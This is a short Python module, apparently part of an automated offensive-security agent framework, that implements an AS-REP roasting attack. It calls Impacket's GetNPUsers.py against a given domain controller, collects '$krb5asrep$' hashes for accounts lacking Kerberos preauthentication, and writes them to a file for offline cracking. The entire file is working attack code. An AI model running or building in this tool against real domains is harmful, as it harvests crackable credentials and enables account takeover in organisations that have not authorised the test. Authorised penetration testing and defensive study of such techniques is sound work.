"""ASREPRoasting Agent - Attack users without Kerberos preauth"""
import asyncio, os
from typing import Dict, Any
from core.base_agent import BaseAgent
from core.agent_data import AgentData

class ASREPRoastingAgent(BaseAgent):
    def __init__(self):
        super().__init__(name="ASREPRoastingAgent", description="Extract AS-REP hashes for users without preauth", version="1.0.0")
        self.output_dir = "workspace/asreproast"
        os.makedirs(self.output_dir, exist_ok=True)
    
    async def run(self, strategy: Dict[str, Any]) -> AgentData:
        try:
            domain, dc_ip = strategy.get('domain'), strategy.get('dc_ip')
            usersfile = strategy.get('usersfile')
            
            if not domain:
                return AgentData(success=False, errors=["Missing domain"])
            
            cmd = ['GetNPUsers.py', domain + '/', '-dc-ip', dc_ip, '-no-pass', '-usersfile', usersfile] if usersfile else ['GetNPUsers.py', domain + '/', '-dc-ip', dc_ip, '-request']
            
            process = await asyncio.create_subprocess_exec(*cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
            stdout, stderr = await process.communicate()
            
            hashes = [line for line in stdout.decode().split('\n') if '$krb5asrep$' in line]
            
            if hashes:
                with open(f'{self.output_dir}/asrep_hashes.txt', 'w') as f:
                    f.write('\n'.join(hashes))
            
            return AgentData(success=len(hashes) > 0, data={'hashes': hashes, 'count': len(hashes)})
        except Exception as e:
            return AgentData(success=False, errors=[str(e)])
